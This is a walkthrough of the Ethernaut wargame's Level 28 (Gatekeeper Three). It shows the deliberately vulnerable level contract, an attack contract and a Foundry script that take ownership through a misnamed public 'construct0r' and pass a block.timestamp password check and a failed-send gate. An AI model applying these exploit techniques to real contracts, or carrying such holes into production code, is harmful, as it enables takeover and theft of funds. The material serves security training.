# Level 28 - Gatekeeper 3 ⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/28" %}

### Level Setup

{% hint style="info" %}
Cope with gates and become an entrant.

**Things that might help:**

* Recall return values of low-level functions.
* Be attentive with semantic.
* Refresh how storage works in Ethereum.
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/GatekeeperThree.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}

```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-28

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-28

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/d3a68c1d0355e625105de3535240f96209c076ce/src/Level28.sol" %}

{% code title="src/Level28.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ================================================================
// │                   LEVEL 28 - GATEKEEPER THREE                │
// ================================================================
interface IGatekeeperThree {
    function construct0r() external;
    function enter() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
}

contract AttackContract {
    IGatekeeperThree gatekeeper;

    constructor(address targetContractAddress) payable {
        gatekeeper = IGatekeeperThree(targetContractAddress);
    }

    function attack() public {
        // ** Gate One **
        gatekeeper.construct0r();

        // ** Gate Two **
        gatekeeper.createTrick();
        gatekeeper.getAllowance(block.timestamp);

        // ** Gate Three **
        (bool success,) = address(gatekeeper).call{value: 0.002 ether}("");
        require(success);

        gatekeeper.enter();
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/d3a68c1d0355e625105de3535240f96209c076ce/script/Level28.s.sol" %}

{% code title="script/Level28.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level28.sol";

// ================================================================
// │                   LEVEL 28 - GATEKEEPER THREE                │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        AttackContract attackContract = new AttackContract{value: 1 ether}(targetContractAddress);
        attackContract.attack();
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Nice job! For more information read [this](https://web3js.readthedocs.io/en/v1.2.9/web3-eth.html?highlight=getStorageAt#getstorageat) and [this](https://medium.com/loom-network/ethereum-solidity-memory-vs-storage-how-to-initialize-an-array-inside-a-struct-184baf6aa2eb).
{% endhint %}
